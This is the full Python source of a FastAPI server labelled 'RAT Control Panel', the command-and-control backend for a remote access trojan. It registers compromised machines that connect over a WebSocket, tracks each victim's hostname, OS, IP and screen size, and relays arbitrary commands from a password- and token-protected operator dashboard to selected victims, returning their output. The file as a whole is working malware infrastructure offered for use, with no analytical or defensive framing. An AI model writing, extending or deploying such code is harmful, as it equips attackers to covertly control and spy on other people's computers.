import asyncio

import json
import logging
import os
import secrets
import time
from datetime import datetime, timedelta
from typing import Any, Dict, Set

import jwt
import psutil
import uvicorn
import websockets
from fastapi import (Depends, FastAPI, HTTPException, Request, WebSocket,
                     WebSocketDisconnect, status)
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.security import HTTPBasic

# --- Configuration ---
class Config:
    def __init__(self):
        self.admin_username = os.getenv("ADMIN_USERNAME")
        self.admin_password = os.getenv("ADMIN_PASSWORD")
        self.jwt_secret = os.getenv("JWT_SECRET")

        if not all([self.admin_username, self.admin_password, self.jwt_secret]):
            raise ValueError("Missing critical environment variables: ADMIN_USERNAME, ADMIN_PASSWORD, JWT_SECRET")

        self.jwt_algo = "HS256"
        self.jwt_exp_minutes = 120
        self.client_timeout = 300  # Seconds
        self.max_failed_logins = 5

# --- Global State Management ---
class ServerState:
    def __init__(self):
        self.rat_clients: Dict[str, WebSocket] = {}
        self.web_ui_sockets: Set[WebSocket] = set()
        self.client_infos: Dict[str, Dict[str, Any]] = {}
        self.command_logs: Dict[str, list] = {}
        self.banned_ips: Set[str] = set()
        self.failed_login_attempts: Dict[str, int] = {}
        self.start_time = time.time()

        # Locks for concurrent access
        self.clients_lock = asyncio.Lock()
        self.ui_sockets_lock = asyncio.Lock()
        self.infos_lock = asyncio.Lock()
        self.logs_lock = asyncio.Lock()
        self.ip_lock = asyncio.Lock()

# --- Initialization ---
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

try:
    config = Config()
    state = ServerState()
except ValueError as e:
    logging.critical(f"Configuration error: {e}")
    exit(1)

app = FastAPI(title="RAT Control Panel", version="2.2.0")
security = HTTPBasic()

# --- Middleware ---
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- Helper Functions ---
async def log_command(client_id: str, action: str, payload: dict):
    async with state.logs_lock:
        if client_id not in state.command_logs:
            state.command_logs[client_id] = []
        
        async with state.infos_lock:
            client_info = state.client_infos.get(client_id, {})

        log_entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "action": action,
            "payload": payload,
            "client_info": client_info
        }
        state.command_logs[client_id].append(log_entry)
        state.command_logs[client_id] = state.command_logs[client_id][-100:]

def get_server_stats() -> Dict[str, Any]:
    try:
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        return {
            "cpu_percent": psutil.cpu_percent(interval=0.1),
            "memory_percent": memory.percent,
            "memory_used_gb": round(memory.used / (1024**3), 2),
            "memory_total_gb": round(memory.total / (1024**3), 2),
            "disk_percent": disk.percent,
            "disk_used_gb": round(disk.used / (1024**3), 2),
            "disk_total_gb": round(disk.total / (1024**3), 2),
            "connected_clients": len(state.rat_clients),
            "web_ui_connections": len(state.web_ui_sockets),
            "banned_ips": len(state.banned_ips),
            "uptime": time.time() - state.start_time
        }
    except Exception as e:
        logging.error(f"Error getting server stats: {e}")
        return {"error": str(e)}

# --- Authentication ---
def create_jwt_token(username: str) -> str:
    payload = {"sub": username, "exp": datetime.utcnow() + timedelta(minutes=config.jwt_exp_minutes)}
    return jwt.encode(payload, config.jwt_secret, algorithm=config.jwt_algo)

def verify_jwt_token(token: str) -> str | None:
    try:
        payload = jwt.decode(token, config.jwt_secret, algorithms=[config.jwt_algo])
        return payload.get("sub")
    except (jwt.ExpiredSignatureError, jwt.InvalidTokenError) as e:
        logging.warning(f"JWT verification failed: {e}")
        return None

async def get_current_user_jwt(request: Request) -> str:
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid authentication credentials")
    
    token = auth_header.split(" ")[1]
    user = verify_jwt_token(token)
    if not user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid or expired token")
    return user

# --- Web UI Endpoints ---
@app.get("/login", response_class=HTMLResponse)
async def get_login_page():
    return FileResponse("login.html")

@app.post("/login")
async def login(request: Request):
    client_ip = request.client.host if request.client else "unknown"
    
    async with state.ip_lock:
        if client_ip in state.banned_ips:
            raise HTTPException(status_code=429, detail="IP is banned")
        if state.failed_login_attempts.get(client_ip, 0) >= config.max_failed_logins:
            state.banned_ips.add(client_ip)
            raise HTTPException(status_code=429, detail="Too many failed login attempts")

    try:
        data = await request.json()
        username = data.get("username")
        password = data.get("password")

        if not isinstance(username, str) or not isinstance(password, str):
            raise HTTPException(status_code=400, detail="Username and password must be strings.")

        if secrets.compare_digest(username, config.admin_username) and secrets.compare_digest(password, config.admin_password):
            async with state.ip_lock:
                state.failed_login_attempts.pop(client_ip, None)
            token = create_jwt_token(username)
            logging.info(f"Successful login for '{username}' from {client_ip}")
            return {"token": token}
        else:
            async with state.ip_lock:
                state.failed_login_attempts[client_ip] = state.failed_login_attempts.get(client_ip, 0) + 1
            logging.warning(f"Failed login attempt for '{username}' from {client_ip}")
            raise HTTPException(status_code=401, detail="Invalid credentials")
            
    except json.JSONDecodeError:
        raise HTTPException(status_code=400, detail="Invalid JSON format")
    except Exception as e:
        logging.error(f"Unexpected login error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/", response_class=HTMLResponse)
async def get_index():
    return FileResponse("index.html")

@app.get("/api/stats")
async def get_stats_api(user: str = Depends(get_current_user_jwt)):
    return get_server_stats()

@app.get("/api/clients")
async def get_clients_api(user: str = Depends(get_current_user_jwt)):
    async with state.infos_lock:
        return {"clients": list(state.client_infos.values())}

# --- WebSocket Communication ---
async def send_to_web_ui(data: dict):
    async with state.ui_sockets_lock:
        if not state.web_ui_sockets:
            return
        message = json.dumps(data)
        await asyncio.gather(*[ws.send_text(message) for ws in state.web_ui_sockets])

async def broadcast_client_list():
    async with state.infos_lock:
        clients_data = list(state.client_infos.values())
    await send_to_web_ui({"type": "client_list", "clients": clients_data})

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    token = websocket.query_params.get("token")
    user = verify_jwt_token(token)
    if not user:
        await websocket.close(code=4401)
        return

    await websocket.accept()
    async with state.ui_sockets_lock:
        state.web_ui_sockets.add(websocket)
    logging.info(f"Web UI connected: {user} ({websocket.client.host})")
    
    await broadcast_client_list()

    try:
        while True:
            data = await websocket.receive_json()
            action = data.get("action")
            
            if action == "get_clients":
                await broadcast_client_list()
                continue

            target_ids = data.get("target_ids", [])
            if isinstance(target_ids, str):
                target_ids = [target_ids]

            if not target_ids:
                await websocket.send_json({"type": "error", "message": "No target clients selected."})
                continue

            async with state.clients_lock:
                for target_id in target_ids:
                    if target_id in state.rat_clients:
                        try:
                            await log_command(target_id, action, data)
                            await state.rat_clients[target_id].send_json(data)
                        except Exception as e:
                            logging.error(f"Error sending to client {target_id}: {e}")
                    else:
                        logging.warning(f"Command for disconnected client {target_id} ignored.")

    except WebSocketDisconnect:
        logging.info(f"Web UI disconnected: {user}")
    except Exception as e:
        logging.error(f"Error in Web UI WebSocket connection: {e}")
    finally:
        async with state.ui_sockets_lock:
            state.web_ui_sockets.discard(websocket)

@app.websocket("/rat")
async def rat_client_endpoint(websocket: WebSocket):
    await websocket.accept()
    client_id = secrets.token_hex(8)
    
    try:
        initial_msg = await asyncio.wait_for(websocket.receive_json(), timeout=20)
        if initial_msg.get("type") != "info":
            await websocket.close(code=1003, reason="Invalid initial message")
            return

        info = initial_msg.get("data", {})
        hostname = info.get("hostname", "Unknown")
        client_ip = websocket.client.host or "unknown"
        
        async with state.clients_lock:
            state.rat_clients[client_id] = websocket
        async with state.infos_lock:
            state.client_infos[client_id] = {
                "id": client_id,
                "hostname": hostname,
                "os": info.get("os", "Unknown"),
                "ip": info.get("ip", client_ip),
                "last_seen": time.time(),
                "screen": info.get("screen", {"width": 0, "height": 0})
            }
        
        logging.info(f"[+] RAT client connected: {hostname} ({client_id}) from {client_ip}")
        await broadcast_client_list()

        while True:
            message = await websocket.receive_json()
            
            if message.get("type") == "ping":
                async with state.infos_lock:
                    if client_id in state.client_infos:
                        state.client_infos[client_id]["last_seen"] = time.time()
                await websocket.send_json({"type": "pong"})
                continue

            message["client_id"] = client_id
            await send_to_web_ui(message)

    except (WebSocketDisconnect, asyncio.TimeoutError, websockets.exceptions.ConnectionClosedError) as e:
        logging.info(f"Client {client_id} disconnected: {type(e).__name__}")
    except Exception as e:
        logging.error(f"Unexpected error with client {client_id}: {e}")
    finally:
        async with state.clients_lock:
            if client_id in state.rat_clients:
                del state.rat_clients[client_id]
        async with state.infos_lock:
            if client_id in state.client_infos:
                del state.client_infos[client_id]
        
        logging.info(f"[-] RAT client disconnected: {client_id}")
        await broadcast_client_list()

# --- Background Tasks ---
async def cleanup_inactive_clients():
    while True:
        await asyncio.sleep(60)
        now = time.time()
        
        async with state.infos_lock:
            inactive_ids = [
                cid for cid, info in state.client_infos.items() 
                if now - info.get("last_seen", now) > config.client_timeout
            ]
        
        if inactive_ids:
            logging.info(f"Removing {len(inactive_ids)} inactive clients...")
            async with state.clients_lock, state.infos_lock:
                for cid in inactive_ids:
                    if cid in state.rat_clients:
                        await state.rat_clients[cid].close()
                        del state.rat_clients[cid]
                    if cid in state.client_infos:
                        del state.client_infos[cid]
            await broadcast_client_list()

@app.on_event("startup")
async def on_startup():
    asyncio.create_task(cleanup_inactive_clients())
    logging.info("Server startup complete. Background tasks running.")

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    logging.info(f"Starting RAT Control Panel on port {port}")
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="info")